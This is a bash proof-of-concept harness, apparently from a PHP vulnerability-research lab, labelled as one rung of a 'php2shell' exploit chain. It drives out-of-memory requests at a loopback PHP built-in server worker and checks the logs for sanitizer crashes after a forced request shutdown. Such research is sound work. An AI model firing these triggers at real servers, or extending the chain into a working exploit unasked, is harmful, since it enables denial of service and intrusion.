#!/bin/bash
# php2shell rung 2 — the CONSUMER that processes OOM-corrupted request state.
#
# SAPI finding this harness rides on (source read, affected 8.4.26):
#   sapi/cli/php_cli_server.c:2311-2313 — when php_request_startup() fails
#   (our OOM-during-parsing shapes), the built-in web server calls
#   php_cli_server_request_shutdown() → php_request_shutdown(0)
#   UNCONDITIONALLY, then keeps serving. That is the mod_php-style consumer
#   the advisory describes ("unconditionally invokes the request shutdown
#   procedure, even when request startup has failed") — reachable here with
#   plain loopback HTTP against a php -S worker, no FastCGI framing.
#   (The php-cgi SAPI, one-shot AND fastcgi mode, calls php_module_shutdown()
#   instead and never consumes the state — cgi_main.c:2464; observed rung 1.)
#
# Scenarios, each against a fresh worker on 127.0.0.1:
#   s1  OOM during request parsing (vendor's oom_request_parsing shape):
#       startup fails mid-hash-insert; php_request_shutdown then walks the
#       half-built state. Look for: sanitizer report, ZEND_ASSERT abort,
#       worker death, or a clean fatal + surviving worker (negative).
#   s2  OOM during user code (runtime bailout): shutdown consumes
#       post-bailout state; then a follow-up probe on the SAME worker
#       checks cross-request survival (CVE-2026-109619 lane).
#
# Usage: bash lab/repro/php2shell-rung2-cli-server.sh <php-bin> [outdir]
#   php-bin: lab/build/php-<ver>-<mode>/sapi/cli/php

set -u
PHP=$(readlink -f "$1")
OUT=${2:-lab/build/evidence}
LABEL=$(printf '%s' "$PHP" | awk -F/ '{print $(NF-1)}')
mkdir -p "$OUT"
PORT=18084
DOCROOT=$(mktemp -d)
LOG="$OUT/rung2-cliserver-$LABEL.log"
: > "$LOG"
trap 'kill "$WPID" 2>/dev/null; rm -rf "$DOCROOT"' EXIT

printf '<?php echo "alive:" . getmypid() . "\n";' > "$DOCROOT/probe.php"
printf '<?php $a=[]; while(true){$a[]=str_repeat("x",1<<20);}' > "$DOCROOT/oom.php"

# --- HTTP helpers (stdlib only, loopback only) ---------------------------
http() { # http METHOD PATH BODYFILE OUTFILE
    python3 - "$PORT" "$1" "$2" "$3" "$4" <<'EOF'
import socket, sys
port, method, path, bodyf, outf = sys.argv[1:]
data = open(bodyf,'rb').read() if bodyf != '-' else b''
req = (f"{method} {path} HTTP/1.1\r\nHost: 127.0.0.1:{port}\r\n"
       f"Content-Type: application/x-www-form-urlencoded\r\n"
       f"Content-Length: {len(data)}\r\nConnection: close\r\n\r\n").encode()
with socket.create_connection(("127.0.0.1", int(port)), timeout=60) as s:
    s.sendall(req + data)
    buf = b''
    while True:
        try:
            chunk = s.recv(65536)
        except socket.timeout:
            buf += b"\n[[client timeout]]"; break
        if not chunk: break
        buf += chunk
open(outf,'wb').write(buf)
EOF
}
alive() { # prints response body of a probe request
    http GET /probe.php - "$OUT/rung2-cliserver-$LABEL-probe.out"
    python3 -c 'import sys;print(sys.stdin.buffer.read().decode("utf8","replace").split("\r\n\r\n",1)[-1])' \
        < "$OUT/rung2-cliserver-$LABEL-probe.out"
}

start_worker() { # start_worker [extra -d args...]
    ASAN_OPTIONS=detect_leaks=0:abort_on_error=1 \
    UBSAN_OPTIONS=halt_on_error=1 \
    "$PHP" -S 127.0.0.1:$PORT -n -t "$DOCROOT" \
        -d memory_limit=8M -d post_max_size=1G \
        -d max_input_vars=10000000 -d html_errors=0 \
        "$@" >> "$LOG" 2>&1 &
    WPID=$!
    for _ in $(seq 1 50); do
        python3 -c "import socket;socket.create_connection(('127.0.0.1',$PORT),1)" 2>/dev/null && return 0
        kill -0 "$WPID" 2>/dev/null || break
        sleep 0.2
    done
    echo "worker failed to come up — see $LOG" >&2
    return 1
}
wait_port_free() { # block until the TCP port is released by the old worker
    python3 - "$PORT" <<'EOF'
import socket, sys, time
for _ in range(100):
    try:
        socket.create_connection(("127.0.0.1", int(sys.argv[1])), 1).close()
        time.sleep(0.1)
    except OSError:
        sys.exit(0)
sys.exit(1)
EOF
}
probe1() { # probe1 — assert the answering worker is OURS, else abort run
    local pid_body pid
    pid_body=$(alive); pid=${pid_body#alive:}
    if [ "$pid" != "$WPID" ]; then
        echo "FATAL: probe answered by pid $pid, expected worker $WPID — port race; abort"
        exit 1
    fi
    echo "$pid_body"
}


# --- s1: OOM during request parsing; consumer = forced php_request_shutdown
wait_port_free
start_worker || exit 1
echo "-- s1 probe1: $(probe1)"
python3 -c "print('a=' + 'x'*6*1024*1024, end='')" > "$DOCROOT/oombody.bin"
http POST /probe.php "$DOCROOT/oombody.bin" "$OUT/rung2-cliserver-$LABEL-s1resp.out"
echo "  s1 oom-resp-tail: $(python3 -c 'import sys;print(sys.stdin.buffer.read().decode("utf8","replace")[-200:].replace(chr(10)," | "))' < "$OUT/rung2-cliserver-$LABEL-s1resp.out")"
sleep 0.3
if kill -0 "$WPID" 2>/dev/null; then
    echo "-- s1 probe2 (same worker?): $(alive)"
    echo "   worker pid $WPID still alive"
else
    echo "-- s1 WORKER DIED (wait=$?)"
fi
kill "$WPID" 2>/dev/null
echo "   s1 worker exit status: $(wait "$WPID" 2>/dev/null; echo $?)"

# --- s2: OOM during user code; then consumer probe on the same worker
wait_port_free
start_worker || exit 1
echo "-- s2 probe1: $(probe1)"
http POST /oom.php - "$OUT/rung2-cliserver-$LABEL-s2resp.out"
echo "  s2 oom-resp-tail: $(python3 -c 'import sys;print(sys.stdin.buffer.read().decode("utf8","replace")[-200:].replace(chr(10)," | "))' < "$OUT/rung2-cliserver-$LABEL-s2resp.out")"
sleep 0.3
if kill -0 "$WPID" 2>/dev/null; then
    echo "-- s2 probe2 (same worker?): $(alive)"
    echo "   worker pid $WPID still alive"
else
    echo "-- s2 WORKER DIED"
fi
kill "$WPID" 2>/dev/null; wait "$WPID" 2>/dev/null

# --- verdict -------------------------------------------------------------
echo "== verdict scan (log: $LOG)"
if grep -qE 'AddressSanitizer|runtime error|SEGV|Assertion|SUMMARY|Aborted' "$LOG"; then
    echo "SANITIZER/ASSERT SIGNALS FOUND — see $LOG"
else
    echo "no sanitizer/assert signal in worker log (negative — record it)"
fi
